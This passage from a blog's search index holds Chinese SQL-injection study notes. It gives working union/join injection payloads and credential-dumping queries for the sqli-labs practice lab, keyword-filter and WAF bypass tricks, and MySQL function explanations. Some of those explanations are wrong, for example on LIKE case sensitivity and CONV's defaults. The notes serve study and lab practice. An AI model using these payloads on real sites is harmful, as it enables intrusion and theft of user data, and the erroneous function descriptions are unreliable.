class=\"hljs plaintext\">SELECT order_number, customer_id FROM orders WHERE EXISTS (SELECT * FROM order_details WHERE orders.order_number = order_details.order_number AND order_details.product_code = &#x27;CSS1&#x27;);<br></code></pre></td></tr></table></figure>\n\n<p>在这个例子中， 假设我们想找到所有购买了“CSS1”产品的客户，那么可以使用<code>EXISTS</code> 条件来完成。</p>\n<h1 id=\"Join-Basic\"><a href=\"#Join-Basic\" class=\"headerlink\" title=\"Join - Basic\"></a>Join - Basic</h1><p>这个我之前博客介绍过了</p>\n<p><a href=\"https://www.handsome-vincent.space/2023/06/08/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12/#5-%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87\">这里</a></p>\n<p>具体的示例这里有个文章介绍的很好：</p>\n<p><a href=\"https://blog.csdn.net/weixin_48083470/article/details/119043137\">SQL注入 right&#x2F;left join 详解与利用_sql注入join</a></p>\n<p>之前笔记提到了两个语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">union select * from (select 1)a join (select 2)b join (select 3)c--+<br><br>union select * from (select * from users join users as b)c --+<br></code></pre></td></tr></table></figure>\n\n<p>他们两个的用处完全不同，</p>\n<p>第一个语句是用来绕过逗号过滤的，</p>\n<p>他的原理就是将分别select1，2，3的结果拼接起来，</p>\n<p>而后面的那个测试通过join的特性来碰撞出列名，</p>\n<p>这一般用来绕过过滤information_schema.columns</p>\n<p>这里拿Less1 实战一下</p>\n<h1 id=\"Join-实战注入\"><a href=\"#Join-实战注入\" class=\"headerlink\" title=\"Join - 实战注入\"></a>Join - 实战注入</h1><ol>\n<li><p>获取字段数</p>\n</li>\n<li><p>获取表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select * from (select 1)a join (select 2)b join (select group_concat(table_name) from information_schema.tables where table_schema=database())c --+<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取列名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select * from (select * from users as a join users as b)c --+<br><br>?id=-1&#x27; union select * from (select * from users as a join users as b using(id))c --+<br><br>?id=-1&#x27; union select * from (select * from users as a join users as b using(id,username))c --+<br><br>?id=-1&#x27; union select * from (select * from users as a join users as b using(id,username,password))c --+<br></code></pre></td></tr></table></figure>\n\n<p>到这里页面没有报错了，说明就是这三列了</p>\n</li>\n<li><p>获取全部数据</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select * from (select 1)a join (select 2)b join (select group_concat(id,username,password) from users)c--+<br></code></pre></td></tr></table></figure></li>\n</ol>\n<p>到此结束</p>\n<h1 id=\"堆叠注入-basic\"><a href=\"#堆叠注入-basic\" class=\"headerlink\" title=\"堆叠注入 - basic\"></a>堆叠注入 - basic</h1><p>堆叠注入的前提是网页源代码对语句使用的是mysqli_multi_query</p>\n<p>而不是mysqli_query，知道了这，我们就可以使用分号来分割我们的语句，</p>\n<p>然后进行多个操作（在一个语句中）</p>\n<p>例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">show databases;select user();<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"堆叠注入-实战\"><a href=\"#堆叠注入-实战\" class=\"headerlink\" title=\"堆叠注入 - 实战\"></a>堆叠注入 - 实战</h1><p>sqllabs-38</p>\n\n\n<p>一般在实战中，</p>\n<p>我们可以通过堆叠注入来绕过union select过滤或者查杀，</p>\n<p>以及通过修改密码的方式来绕过登录密码，</p>\n<p>（就和todesk替换config.ini远控那个思路一样）</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/qq_38612882/article/details/122589853\">渗透测试-SQL注入之堆叠注入-攻防世界supersqli实战_保持微笑-泽的博客-CSDN博客</a></p>\n</blockquote>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#17","url":"/2023/06/15/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-17/","content":"<p>这篇文章是一些函数、语句学习</p>\n<span id=\"more\"></span>\n\n<h1 id=\"cast函数\"><a href=\"#cast函数\" class=\"headerlink\" title=\"cast函数\"></a>cast函数</h1><p><code>CAST()</code> 函数是 MySQL 中一种类型转换函数，用于将一个数据类型转换为另一个数据类型。该函数通常可以用于针对某些列或变量进行特定的计算或操作，需要将其转换成特定的数据类型才能完成。下面是 <code>CAST()</code> 函数的基本语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">CAST(expression AS data_type)<br></code></pre></td></tr></table></figure>\n\n<p>其中 <code>expression</code> 表示待转换的表达式或值， <code>data_type</code> 表示要转换到的目标数据类型。</p>\n<p>以下是几个示例:</p>\n<p>将字符串转换为整数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT CAST(&#x27;42&#x27; AS SIGNED);<br></code></pre></td></tr></table></figure>\n\n<p>将浮点数转换为整数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT CAST(3.14159 AS UNSIGNED);<br></code></pre></td></tr></table></figure>\n\n<p>将日期字符串转换为日期类型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT CAST(&#x27;2022-12-31&#x27; AS DATE);<br></code></pre></td></tr></table></figure>\n\n<p>需要注意的是， <code>CAST()</code> 函数不会改变原始表达式或值本身的数据类型，而是返回一个转换后的值。如果要更改数据表中的列的数据类型，请使用 <code>ALTER TABLE</code> 语句。</p>\n<hr>\n<p>例子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">select cast(&#x27;123&#x27; as char);<br></code></pre></td></tr></table></figure>\n\n<p>然后这里我搜了一下有哪些数据类型：</p>\n<ol>\n<li>数值类型（Numeric Types）<ul>\n<li>TINYINT</li>\n<li>SMALLINT</li>\n<li>MEDIUMINT</li>\n<li>INT&#x2F;INTEGER</li>\n<li>BIGINT</li>\n<li>FLOAT</li>\n<li>DOUBLE</li>\n<li>DECIMAL</li>\n</ul>\n</li>\n<li>日期和时间类型(Date and Time Types)<ul>\n<li>DATE</li>\n<li>TIME</li>\n<li>DATETIME</li>\n<li>TIMESTAMP</li>\n<li>YEAR</li>\n</ul>\n</li>\n<li>字符串类型(String Types)<ul>\n<li>CHAR</li>\n<li>VARCHAR</li>\n<li>TINYTEXT</li>\n<li>TEXT</li>\n<li>MEDIUMTEXT</li>\n<li>LONGTEXT</li>\n<li>BINARY</li>\n<li>VARBINARY</li>\n<li>BLOB</li>\n<li>ENUM</li>\n<li>SET</li>\n</ul>\n</li>\n<li>布尔类型(Boolean Type)<ul>\n<li>BOOLEANBOOL</li>\n</ul>\n</li>\n<li>位数据类型（Bit-Value Types）<ul>\n<li>BIT</li>\n</ul>\n</li>\n<li>JSON数据类型(JSON Data Type)<ul>\n<li>JSON</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"ifnull函数\"><a href=\"#ifnull函数\" class=\"headerlink\" title=\"ifnull函数\"></a>ifnull函数</h1><p>MySQL <code>IFNULL()</code> 函数用于替换表达式中的 NULL 值。如果表达式的值为 NULL，则返回替换后的值；否则返回原始值。</p>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">IFNULL(expr1, expr2)<br></code></pre></td></tr></table></figure>\n\n<p>参数说明：</p>\n<ul>\n<li><code>expr1</code>：要检查是否为 NULL 的表达式。</li>\n<li><code>expr2</code>：如果 <code>expr1</code> 为 NULL，则返回 <code>expr2</code> 替代；否则返回 <code>expr1</code> 原始值。</li>\n</ul>\n<p>示例：</p>\n<p>假设我们有一个名为 <code>orders</code> 的表，其中包含以下数据：</p>\n<table>\n<thead>\n<tr>\n<th>order_id</th>\n<th>customer_name</th>\n<th>order_date</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>001</td>\n<td>Alice</td>\n<td>2021-01-01</td>\n</tr>\n<tr>\n<td>002</td>\n<td>Bob</td>\n<td>NULL</td>\n</tr>\n<tr>\n<td>003</td>\n<td>Cindy</td>\n<td>2021-01-03</td>\n</tr>\n<tr>\n<td>004</td>\n<td>NULL</td>\n<td>2021-01-04</td>\n</tr>\n</tbody></table>\n<p>现在，我们想要按照特定条件查询订单信息，如下所示：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <br>    order_id,<br>    IFNULL(customer_name, <span class=\"hljs-string\">&#x27;N/A&#x27;</span>) <span class=\"hljs-keyword\">as</span> customer_name,<br>    IFNULL(order_date, <span class=\"hljs-string\">&#x27;N/A&#x27;</span>) <span class=\"hljs-keyword\">as</span> order_date<br><span class=\"hljs-keyword\">FROM</span> orders;<br></code></pre></td></tr></table></figure>\n\n<p>结果将会是：</p>\n<table>\n<thead>\n<tr>\n<th>order_id</th>\n<th>customer_name</th>\n<th>order_date</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>001</td>\n<td>Alice</td>\n<td>2021-01-01</td>\n</tr>\n<tr>\n<td>002</td>\n<td>Bob</td>\n<td>N&#x2F;A</td>\n</tr>\n<tr>\n<td>003</td>\n<td>Cindy</td>\n<td>2021-01-03</td>\n</tr>\n<tr>\n<td>004</td>\n<td>N&#x2F;A</td>\n<td>2021-01-04</td>\n</tr>\n</tbody></table>\n<p>如上所示，使用 <code>IFNULL()</code> 函数使得查询结果中不会出现 NULL 值，同时提供了一个合适的替代值。</p>\n<hr>\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; select ifnull(null,&#x27;a&#x27;);<br>+------------------+<br>| ifnull(null,&#x27;a&#x27;) |<br>+------------------+<br>| a                |<br>+------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select ifnull(1,&#x27;a&#x27;);<br>+---------------+<br>| ifnull(1,&#x27;a&#x27;) |<br>+---------------+<br>| 1             |<br>+---------------+<br></code></pre></td></tr></table></figure>\n\n<p>意思就是如果第一个值为空则返回第二个值，否则返回第一个值</p>\n<p>这个在实战中可能可以达到出其不意的效果，</p>\n<p>因为这同样有回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,2,ifnull(cast(security.users.username as char),&#x27;no&#x27;) from users--+<br></code></pre></td></tr></table></figure>\n\n<p>但是可能有点慢，因为一次只能回显一行</p>\n<h1 id=\"union-all-select-语句\"><a href=\"#union-all-select-语句\" class=\"headerlink\" title=\"union all select 语句\"></a>union all select 语句</h1><p><code>UNION ALL SELECT</code>是MySQL中用于合并多个SELECT查询结果的语法。在使用该语法时，要求每个SELECT语句的列数和数据类型必须相同，否则会出现错误。</p>\n<p>语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT column_name(s) FROM table1<br>UNION ALL<br>SELECT column_name(s) FROM table2;<br></code></pre></td></tr></table></figure>\n\n<p>该语法会将<code>table1</code>和<code>table2</code>两个表中的记录合并起来，并返回一个包含所有匹配记录的结果集。UNION ALL操作可以重复输出包含重复值的行，因此如果需要去重，应该使用<code>UNION</code>语法。</p>\n<p>例子：</p>\n<p>假设有两个表格 <code>employees1</code> 和 <code>employees2</code>，都拥有列名为 <code>name</code> 和 <code>salary</code> 的列，现在我们想把这两个表中的对应行进行合并，可以使用如下 SQL 语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT name, salary FROM employees1<br>UNION ALL<br>SELECT name, salary FROM employees2;<br></code></pre></td></tr></table></figure>\n\n<p>这条 SQL 语句会返回一个结果集，其中包含了 <code>employees1</code> 和 <code>employees2</code> 表中的所有行。</p>\n<hr>\n<p>这里我不经想问：他和union select的区别是什么呢？</p>\n<hr>\n<p><code>UNION ALL SELECT</code>和<code>UNION SELECT</code>是SQL语句中用于合并两个或多个查询结果的关键字。</p>\n<p><code>UNION SELECT</code>可以简写为<code>UNION</code>，而区别在于加不加<code>ALL</code>，此外两者还有以下区别：</p>\n<ul>\n<li><code>UNION SELECT</code>会对查询结果进行去重操作，而<code>UNION ALL SELECT</code>不会。这意味着如果两个查询结果集中存在相同的行，则只会返回一次。</li>\n<li>去重操作并不是没有代价的，它可能会对查询性能产生负面影响。因此，如果你确定查询结果集中不会存在重复行，或者你需要保留所有的行，那么使用<code>UNION ALL SELECT</code>可以获得更好的性能。</li>\n</ul>\n<p>综上所述，如果需要对查询结果集进行去重操作，则使用<code>UNION SELECT</code>；否则使用<code>UNION ALL SELECT</code>可以获得更好的性能。</p>\n<hr>\n<p>虽然我不知道我知道这个有什么用处，</p>\n<p>但是可能在免杀中有出其不意的效果吧</p>\n<h1 id=\"strcmp函数\"><a href=\"#strcmp函数\" class=\"headerlink\" title=\"strcmp函数\"></a>strcmp函数</h1><p>MySQL 中的 strcmp 函数是用于比较两个字符串的函数。它接受两个参数作为输入，这些参数是要比较的两个字符串。该函数返回一个整数值，该值指示两个字符串之间的关系。</p>\n<p>下面是 MySQL strcmp 函数的语法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">STRCMP(string1, string2)<br></code></pre></td></tr></table></figure>\n<p>其中，<code>string1</code> 和 <code>string2</code> 是要比较的两个字符串。</p>\n<p>该函数返回以下值之一：</p>\n<ul>\n<li>如果 <code>string1</code> 小于 <code>string2</code>，则返回值为负数。</li>\n<li>如果 <code>string1</code> 等于 <code>string2</code>，则返回 0。</li>\n<li>如果 <code>string1</code> 大于 <code>string2</code>，则返回值为正数。</li>\n</ul>\n<p>例如，如果我们想要按字典顺序对字符串进行排序，我们可以使用 strcmp 函数。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> table_name <span class=\"hljs-keyword\">ORDER</span> <span class=\"hljs-keyword\">BY</span> STRCMP(column1, column2);<br></code></pre></td></tr></table></figure>\n\n<p>此查询会按升序或降序（取决于返回值）排列由 column1 和 column2 形成的字符串对。</p>\n<hr>\n<p>实战中用于盲注</p>\n<h1 id=\"各种运算\"><a href=\"#各种运算\" class=\"headerlink\" title=\"各种运算\"></a>各种运算</h1><blockquote>\n<p><a href=\"https://www.runoob.com/mysql/mysql-operator.html\">MySQL 运算符 | 菜鸟教程 (runoob.com)</a></p>\n</blockquote>\n<p>当然他介绍的还不是很全面，可以看一下chatgpt的回答：</p>\n<p>以下是MySQL中常用的运算符：</p>\n<ol>\n<li>算术运算符</li>\n</ol>\n<ul>\n<li><code>+</code>：加法</li>\n<li><code>-</code>：减法</li>\n<li><code>*</code>：乘法</li>\n<li><code>/</code>：除法 （注：这个似乎可以写成DIV）</li>\n<li><code>%</code>：取模（求余数）  （注：这个似乎可以写成MOD）</li>\n</ul>\n<ol>\n<li>比较运算符</li>\n</ol>\n<ul>\n<li><code>=</code>：等于</li>\n<li><code>&lt;&gt;</code> 或 <code>!=</code>：不等于</li>\n<li><code>&lt;</code>：小于</li>\n<li><code>&gt;</code>：大于</li>\n<li><code>&lt;=</code>：小于等于</li>\n<li><code>&gt;=</code>：大于等于</li>\n</ul>\n<ol>\n<li>逻辑运算符</li>\n</ol>\n<ul>\n<li><p><code>AND</code>：逻辑与 （符号&amp;&amp;）</p>\n</li>\n<li><p><code>OR</code>：逻辑或    （符号||）</p>\n</li>\n<li><p><code>NOT</code>：逻辑非  （符号!）</p>\n</li>\n</ul>\n<ol>\n<li>字符串运算符</li>\n</ol>\n<ul>\n<li><code>CONCAT</code>：字符串连接</li>\n<li><code>LIKE</code>：模糊匹配</li>\n<li><code>IN</code>：判断是否在一组值中</li>\n<li><code>BETWEEN</code>：判断是否在指定范围内</li>\n</ul>\n<ol>\n<li>空值判断运算符</li>\n</ol>\n<ul>\n<li><code>IS NULL</code>：判断是否为NULL</li>\n<li><code>IS NOT NULL</code>：判断是否不为NULL</li>\n</ul>\n<hr>\n<p>我记得还有一些运算符的。。。我补充一下</p>\n<h2 id=\"“-”-二进制下按位或\"><a href=\"#“-”-二进制下按位或\" class=\"headerlink\" title=\"“|” 二进制下按位或\"></a>“|” 二进制下按位或</h2><p>MySQL中的“|”符号是二进制按位OR操作符。在执行比较运算时，使用该操作符将两个二进制数的位进行比较，如果至少有一个位被设置为1，则结果也是1。可以在SELECT语句中使用它作为逻辑运算符来组合多个条件，也可以在UPDATE或INSERT语句中将其用于修改二进制数据类型的值。 </p>\n<p>下面是一个示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">SELECT * FROM table_name WHERE column_name = 1 | 2;<br></code></pre></td></tr></table></figure>\n\n<p>在上面的示例代码中，使用“|”操作符将值1和值2进行按位OR操作，然后将结果与列column_name中的值进行比较。如果该列中的值包含任何一个位等于1，那么该行将匹配该条件。</p>\n<p>请注意，如果你要在WHERE子句中进行按位操作，请确保使用括号正确分组，以防止意外的结果。例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">SELECT * FROM table_name WHERE (column_name &amp; 8) &gt; 0 AND (column_name &amp; 16) = 0;<br></code></pre></td></tr></table></figure>\n\n<p>在上面的示例代码中，使用“&amp;”操作符将column_name的值与8和16进行按位AND操作。第一个条件检查8位是否设置(返回非零值)，第二个条件检查16位是否未设置(返回零值)。两个条件必须同时满足才能匹配该行记录。</p>\n<p>例如，1 | 2 的结果是3（二进制为0001|0010&#x3D;0011），其中第1位和第2位都被设置为1了，因此结果为3。</p>\n<p>同样的，1 | 1 的结果是1(二进制为0001|0001&#x3D;0001)，因为第1位是1了。</p>\n<hr>\n<p>这个似乎已经被安全狗杀死了，进入全国联保套餐了。。。</p>\n<h2 id=\"“-amp-”-二进制下按位或\"><a href=\"#“-amp-”-二进制下按位或\" class=\"headerlink\" title=\"“&amp;” 二进制下按位或\"></a>“&amp;” 二进制下按位或</h2><h2 id=\"“-”-异或\"><a href=\"#“-”-异或\" class=\"headerlink\" title=\"“^” 异或\"></a>“^” 异或</h2><p>在 MySQL 中，符号“^”表示按位异或运算符。按位异或操作会将两个二进制数中的每一个对应位进行异或操作，并输出结果。</p>\n<p>例如：假设我们有两个二进制数10和6，它们的二进制分别为1010和0110。那么当我们对它们进行按位异或运算时，得到的结果为1100（二进制），转换成十进制即为12。</p>\n<p>下面是按位异或运算符的一些示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT 10 ^ 6;  -- 输出 12<br>SELECT 5 ^ 3;   -- 输出 6<br>SELECT 2 ^ 8;   -- 输出 10<br></code></pre></td></tr></table></figure>\n\n<p>请注意：在 MySQL 中，符号“^”还可以用作按位或和按位异或赋值运算符。这些是不同的运算符，将在其他问题中进行描述。</p>\n<hr>\n<p>与我们熟知的异或有一点不一样，</p>\n<p>我们的异或都是二进制下的异或，</p>\n<p>但是这里是先把十进制转换为二进制然后再异或的</p>\n<h2 id=\"“-gt-gt-”-和-“-lt-lt-”-位运算符\"><a href=\"#“-gt-gt-”-和-“-lt-lt-”-位运算符\" class=\"headerlink\" title=\"“&gt;&gt;”   和   “&lt;&lt;” 位运算符\"></a>“&gt;&gt;”   和   “&lt;&lt;” 位运算符</h2><p>MySQL提供了多种运算符，包括算术、比较、逻辑和位运算符等。其中，&lt;&lt;是一种位运算符。</p>\n<p>位运算符是对二进制数进行操作的运算符。&lt;&lt;表示左移位运算符，在二进制数中将所有位向左移动指定的次数，并在右侧添加零位。例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT 8 &lt;&lt; 2; -- 结果为32<br>-- 将8的二进制数1000左移两位，即变成100000，转换为10进制数即为32。<br></code></pre></td></tr></table></figure>\n\n<p>移动的位数是通过右侧的数字来指定的，这个数字必须是非负整数。左移过程中，超出数据类型长度的高位将被丢弃。如果移动的是负数位数，则会进行右移运算。</p>\n<p>&lt;&lt; 运算可以用于替代某些算术运算，如乘以2^n（2的n次方）。因此，在某些情况下，使用位运算符可能会比使用算术运算符更高效。</p>\n<hr>\n<p>剩下一个符号同理</p>\n<h2 id=\"LIKE-模糊匹配\"><a href=\"#LIKE-模糊匹配\" class=\"headerlink\" title=\"LIKE 模糊匹配\"></a>LIKE 模糊匹配</h2><p>在MySQL中，”LIKE” 运算符用于执行模糊匹配操作。它通常与通配符一起使用，以在字符串比较中进行模式匹配。</p>\n<p>“LIKE” 运算符基于模式匹配规则来比较字符串。以下是一些常用的通配符：</p>\n<ol>\n<li>百分号（%）：表示任意字符序列（包括空字符序列）。</li>\n<li>下划线（_）：表示任意单个字符。</li>\n</ol>\n<p>下面是一些使用 “LIKE” 运算符进行模糊匹配的示例：</p>\n<ol>\n<li>匹配以特定字符串开头的值：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT * FROM table_name WHERE column_name LIKE &#x27;prefix%&#x27;;<br></code></pre></td></tr></table></figure>\n\n<p>这将返回以 “prefix” 开头的所有值。</p>\n<ol>\n<li>匹配以特定字符串结尾的值：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT * FROM table_name WHERE column_name LIKE &#x27;%suffix&#x27;;<br></code></pre></td></tr></table></figure>\n\n<p>这将返回以 “suffix” 结尾的所有值。</p>\n<ol>\n<li>匹配包含特定字符串的值：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT * FROM table_name WHERE column_name LIKE &#x27;%keyword%&#x27;;<br></code></pre></td></tr></table></figure>\n\n<p>这将返回包含 “keyword” 的任何位置的所有值。</p>\n<ol>\n<li>匹配符合指定模式的值：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT * FROM table_name WHERE column_name LIKE &#x27;pattern&#x27;;<br></code></pre></td></tr></table></figure>\n\n<p>在模式中可以使用百分号和下划线通配符进行更复杂的模糊匹配。</p>\n<p>请注意，”LIKE” 运算符对大小写敏感。如果需要进行不区分大小写的模糊匹配，可以使用 “LIKE” 运算符的函数形式，如 “LIKE BINARY” 或 “LIKE COLLATE”，或者使用 “REGEXP” 运算符配合正则表达式进行匹配。</p>\n<hr>\n<p>这个没什么用处，知道即可</p>\n<h2 id=\"REGEXP-或-RLIKE-正则式匹配\"><a href=\"#REGEXP-或-RLIKE-正则式匹配\" class=\"headerlink\" title=\"REGEXP 或 RLIKE 正则式匹配\"></a>REGEXP 或 RLIKE 正则式匹配</h2><p>MySQL中的REGEXP和RLIKE都是用于正则表达式匹配的操作符。这两个关键字可以互换使用，因为它们的作用完全相同。</p>\n<p>语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">expr REGEXP pattern<br>或<br>expr RLIKE pattern<br></code></pre></td></tr></table></figure>\n\n<p>其中，<code>expr</code>是待匹配的字符串或列名称，<code>pattern</code>是正则表达式。</p>\n<p>下面介绍一些常用的正则表达式符号（请注意：不是所有的正则表达式符号在MySQL中都被支持）：</p>\n<ul>\n<li><code>^</code> 匹配行首。</li>\n<li><code>$</code> 匹配行尾。</li>\n<li><code>.</code> 匹配任意一个字符。</li>\n<li><code>*</code> 匹配前面的字符0次或多次。</li>\n<li><code>+</code> 匹配前面的字符1次或多次。</li>\n<li><code>?</code> 匹配前面的字符0次或1次。</li>\n<li><code>|</code> 或者符号，表示匹配多个模式之一。</li>\n<li><code>[abc]</code> 可以匹配a、b或c。</li>\n<li><code>[^abc]</code> 可以匹配除了a、b和c以外的任何字符。</li>\n<li><code>[a-z]</code> 可以匹配任何小写字母。</li>\n<li><code>[A-Z]</code> 可以匹配任何大写字母。</li>\n<li><code>[0-9]</code> 可以匹配任何数字。</li>\n</ul>\n<p>例如：</p>\n<p><code>SELECT * FROM mytable WHERE name REGEXP &#39;^J&#39;</code></p>\n<p>上述查询语句将返回表格mytable中名字以字母J开头的所有行。</p>\n<p><code>SELECT * FROM mytable WHERE name RLIKE &#39;a+$&#39;</code></p>\n<p>上述查询语句将返回表格mytable中名字以一个或多个字母a结尾的所有行。</p>\n<hr>\n<p>这个现在以我的水平暂时用不到，</p>\n<p>不过后面肯定会学习正则语法的</p>\n<h1 id=\"HAVING-关键字\"><a href=\"#HAVING-关键字\" class=\"headerlink\" title=\"HAVING 关键字\"></a>HAVING 关键字</h1><p><code>HAVING</code> 是 MySQL 中用于筛选聚合查询结果的关键字。通常在 GROUP BY 子句之后使用，作为对分组结果再次进行过滤的条件。</p>\n<p>例如，如果我们有一个名为 <code>orders</code> 的表包含订单信息，我们想知道每个客户的总订单数，但只想查找那些具有超过 10 笔订单的客户，可以这样写：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT customer_id, COUNT(*) as order_count<br>FROM orders<br>GROUP BY customer_id<br>HAVING order_count &gt; 10;<br></code></pre></td></tr></table></figure>\n\n<p>在这个例子中，<code>HAVING</code> 子句允许我们根据聚合计算结果来过滤组数据，并返回仅符合条件的结果。</p>\n<hr>\n<p>这个可以用来bypass安全狗的检测：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">Keyword filer: \t\tand, or, union, where, limit<br>\t----------------------------------------------------------------------<br>\tPHP filter code:\tpreg_match(&#x27;/(and|or|union|where|limit)/i&#x27;, $id)<br>\tFiltered injection:\t1 || (select user from users limit 1) = &#x27;admin&#x27;<br>\tBypassed injection:\t1 || (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;<br>\t----------------------------------------------------------------------<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"conv函数\"><a href=\"#conv函数\" class=\"headerlink\" title=\"conv函数\"></a>conv函数</h1><p>MySQL的CONV函数用于将输入的表示为一个数字的字符串，转换成指定进制的值。</p>\n<p>该函数的语法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">CONV(number,from_base,to_base)<br></code></pre></td></tr></table></figure>\n\n<p>其中，number表示一个被表示为数字字符串的数值；from_base和to_base分别表示原来字符串所使用的进制和要转换成的目标进制。这两个参数都是可选的，默认情况下它们都是10，即表示十进制。</p>\n<p>例如，要将二进制数11101转换成十进制数，可以使用以下语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT CONV(&#x27;11101&#x27;, 2, 10);<br></code></pre></td></tr></table></figure>\n\n<p>其结果为29。</p>\n<h1 id=\"lpad函数\"><a href=\"#lpad函数\" class=\"headerlink\" title=\"lpad函数\"></a>lpad函数</h1><p><code>LPAD()</code>是MySQL函数库中的一个字符串函数，在MySQL版本4.0及以上可用。这个函数的主要作用是在字符串左侧填充指定字符，例如在数字前面添加”0”等。</p>\n<p>下面是<code>LPAD()</code>函数的语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">LPAD(str,length,padstr)<br></code></pre></td></tr></table></figure>\n\n<p>其中，<code>str</code>指原字符串的名称或常量值，<code>length</code>指新字符串的长度，<code>padstr</code>指填充的字符。如果原字符串的长度小于指定的长度，则新字符串从左侧开始填充指定字符，直到达到指定长度；如果原字符串的长度已经等于指定的长度，则返回原字符串。</p>\n<p>下面是一个使用<code>LPAD()</code>函数将数字格式化为指定长度的例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT LPAD(&#x27;123&#x27;,5,&#x27;0&#x27;); <br></code></pre></td></tr></table></figure>\n\n<p>执行上述语句后，将返回结果为”00123”。</p>\n<h1 id=\"elt函数\"><a href=\"#elt函数\" class=\"headerlink\" title=\"elt函数\"></a>elt函数</h1><p>MySQL的ELT函数是一种用于返回给定数字列表中指定索引处元素值的函数。ELT函数使用以下语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">ELT(index, str1, str2, ..., strN)<br></code></pre></td></tr></table></figure>\n\n<p>其中，<code>index</code>表示要返回的元素的位置。<code>str1</code>，<code>str2</code>，…，<code>strN</code>是待选字符串列表，它们的位置从1开始编号。</p>\n<p>例如，以下示例使用ELT函数检索员工部门的名称，根据其在表中的位置进行指定：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT ELT(dept_id, &#x27;Sales&#x27;, &#x27;Marketing&#x27;, &#x27;Engineering&#x27;, &#x27;Finance&#x27;) AS department<br>FROM 